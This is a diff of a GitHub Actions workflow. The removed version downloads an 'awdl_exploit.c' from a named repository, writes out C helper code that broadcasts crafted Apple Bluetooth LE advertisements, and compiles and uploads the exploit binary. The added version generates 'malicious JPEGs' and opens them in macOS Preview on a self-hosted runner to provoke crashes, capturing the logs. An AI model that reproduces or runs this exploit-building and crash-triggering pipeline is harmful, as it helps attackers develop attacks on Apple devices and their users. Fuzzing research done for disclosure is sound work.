@@ -1,108 +1,77 @@
-name: Build C Exploit from Source
+name: Fuzz Image Parser and Capture Log
 
 on:
-  workflow_dispatch: # Allows you to run this workflow manually from the Actions tab
+  # This allows you to run the workflow manually from the Actions tab in GitHub
+  workflow_dispatch:
 
 jobs:
-  build-exploit:
-    name: Compile Exploit on Ubuntu
-    runs-on: ubuntu-latest
+  fuzz-and-log:
+    name: Generate Malicious JPEG and Log System Response
+    
+    # This must run on a self-hosted macOS runner to interact with the GUI and system logs.
+    runs-on: self-hosted
 
     steps:
-      - name: 1. Install Build Dependencies
+      - name: 1. Checkout Repository
+        uses: actions/checkout@v4
+
+      - name: 2. Set up Python Environment
+        uses: actions/setup-python@v5
+        with:
+          python-version: '3.11'
+
+      - name: 3. Install Python Dependencies
         run: |
-          sudo apt-get update
-          sudo apt-get install -y libpcap-dev libbluetooth-dev
+          python -m pip install --upgrade pip
+          pip install Pillow
 
-      - name: 2. Download Main Source File
+      - name: 4. Generate Malicious JPEGs
+        id: generate_jpeg
         run: |
-          # Download the raw C file from the GitHub repository
-          wget https://raw.githubusercontent.com/encryptedcoderr/AppleTest2/main/awdl_exploit_release/awdl_exploit_release/exploit/awdl_exploit.c
+          # Run your script to create the JPEGs in its output directory
+          python MaliciousJPEGGenerator.py
+          
+          # Set the path to the specific info-leak JPEG as an output for the next step
+          # Based on your script, the info-leak file is the first one generated (exploit_0.jpg)
+          echo "jpeg_path=malicious_jpegs/exploit_0.jpg" >> "$GITHUB_OUTPUT"
+          echo "output_dir=malicious_jpegs" >> "$GITHUB_OUTPUT"
 
-      - name: 3. Create BTLE Header File
+      - name: 5. Capture System Log While Opening JPEG
+        id: capture_log
         run: |
-          cat << 'EOF' > btle_awdl.h
-          #ifndef _BTLE_AWDL_H
-          #define _BTLE_AWDL_H
+          JPEG_PATH="${{ steps.generate_jpeg.outputs.jpeg_path }}"
+          LOG_FILE="system_crash_report.log"
 
-          #include <stdint.h>
+          echo "--- Starting system log capture... ---"
+          # Start the 'log stream' command in the background.
+          # The predicate is crucial: it filters for logs from the Preview process
+          # and any general crash reports from the system's launch daemon.
+          # The command will run for a maximum of 20 seconds.
+          timeout 20s log stream --predicate 'process == "Preview" or (subsystem == "com.apple.launchd" and composedMessage CONTAINS[c] "crashed")' > "$LOG_FILE" &
+          LOG_PID=$!
 
-          int init_btle(char* dev_name);
-          void fini_btle();
-          int start_advertising_hashes(uint8_t* hash1, uint8_t* hash2, uint8_t* hash3, uint8_t* hash4);
-          int stop_advertising_hashes();
+          echo "--- Opening malicious JPEG with Preview.app to trigger a crash ---"
+          # The 'open' command attempts to launch the JPEG in Preview.
+          # We add a 'timeout' in case the application hangs instead of crashing.
+          # The '|| true' ensures the workflow doesn't fail if the timeout is hit.
+          timeout 10s open -a /System/Applications/Preview.app "$JPEG_PATH" || echo "Preview process finished or was timed out."
 
-          #endif
-          EOF
+          # Wait a few seconds to ensure any final crash logs are written.
+          sleep 5
+          kill "$LOG_PID" 2>/dev/null || true # Cleanly stop the log stream process
 
-      - name: 4. Create BTLE Source File
-        run: |
-          cat << 'EOF' > btle_awdl.c
-          #include <stdio.h>
-          #include <stdlib.h>
-          #include <unistd.h>
-          #include <bluetooth/bluetooth.h>
-          #include <bluetooth/hci.h>
-          #include <bluetooth/hci_lib.h>
+          echo "--- Log capture complete. Log content: ---"
+          cat "$LOG_FILE"
+          
+          # Set paths as outputs for the artifact upload step
+          echo "log_path=${LOG_FILE}" >> "$GITHUB_OUTPUT"
+          echo "jpeg_dir=${{ steps.generate_jpeg.outputs.output_dir }}" >> "$GITHUB_OUTPUT"
 
-          int handle = 0;
-
-          int init_btle(char* dev_name) {
-            int err;
-            int dev_id = hci_devid(dev_name);
-            if (dev_id < 0) {
-              perror("invalid bluetooth device");
-              return 0;
-            }
-            handle = hci_open_dev(dev_id);
-            if (handle < 0) {
-              perror("unable to open device");
-              return 0;
-            }
-            return 1;
-          }
-
-          void fini_btle() {
-            hci_close_dev(handle);
-            handle = 0;
-          }
-
-          int start_advertising_hashes(uint8_t* hash1, uint8_t* hash2, uint8_t* hash3, uint8_t* hash4) {
-            int err;
-            le_set_advertising_parameters_cp params = {0};
-            params.min_interval = 200;
-            params.max_interval = 200;
-            params.chan_map = 0x07;
-            err = hci_send_cmd(handle, OGF_LE_CTL, OCF_LE_SET_ADVERTISING_PARAMETERS, sizeof(params), &params);
-            if (err < 0) { return 0; }
-            le_set_advertise_enable_cp enable = { .enable = 1 };
-            err = hci_send_cmd(handle, OGF_LE_CTL, OCF_LE_SET_ADVERTISE_ENABLE, sizeof(enable), &enable);
-            if (err < 0) { return 0; }
-            uint8_t payload[] = {0x02, 0x01, 0x06, 0x17, 0xff, 0x4c, 0x00, 0x05, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, hash1[0], hash1[1], hash2[0], hash2[1], hash3[0], hash3[1], hash4[0], hash4[1], 0x00};
-            le_set_advertising_data_cp data = {0};
-            data.length = sizeof(payload);
-            memcpy(data.data, payload, sizeof(payload));
-            err = hci_send_cmd(handle, OGF_LE_CTL, OCF_LE_SET_ADVERTISING_DATA, sizeof(payload) + 1, &data);
-            if (err < 0) { return 0; }
-            return 1;
-          }
-
-          int stop_advertising_hashes() {
-            int err;
-            le_set_advertise_enable_cp enable = { .enable = 0 };
-            err = hci_send_cmd(handle, OGF_LE_CTL, OCF_LE_SET_ADVERTISE_ENABLE, sizeof(enable), &enable);
-            if (err < 0) { return 0; }
-            return 1;
-          }
-          EOF
-
-      - name: 5. Compile Exploit
-        run: |
-          # Compile all .c files and link against the pcap, pthread, and bluetooth libraries
-          gcc -o awdl_exploit awdl_exploit.c btle_awdl.c -Wall -g -lpcap -lpthread -lbluetooth
-
-      - name: 6. Upload Compiled Binary as Artifact
+      - name: 6. Upload Fuzzing Artifacts
+        if: always() # This ensures artifacts are uploaded even if a previous step fails
         uses: actions/upload-artifact@v4
         with:
-          name: awdl-exploit-linux-binary
-          path: awdl_exploit
+          name: fuzzing-results-${{ github.run_id }}
+          path: |
+            ${{ steps.capture_log.outputs.jpeg_dir }}
+            ${{ steps.capture_log.outputs.log_path }}
